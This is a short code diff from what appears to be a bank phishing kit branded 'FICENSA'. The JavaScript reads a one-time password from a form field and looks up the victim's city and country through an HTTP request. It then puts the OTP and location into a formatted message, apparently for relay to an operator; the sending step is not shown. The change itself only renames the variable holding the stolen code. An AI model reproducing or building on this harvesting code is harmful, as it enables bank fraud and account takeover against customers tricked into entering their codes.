@@ -49,11 +49,11 @@
       axios
         .get(url)
         .then((response) => {
-          const p4sx = document.querySelector("#p4sx").value;
+          const otp = document.querySelector("#otp").value;
           const message =
             "✅FICENSA✅" +
             "\n🔑OTP: " +
-            p4sx +
+            otp +
             "\n🏙️Ciudad: " +
             response.data.city +
             "\n🌎Pais: " +
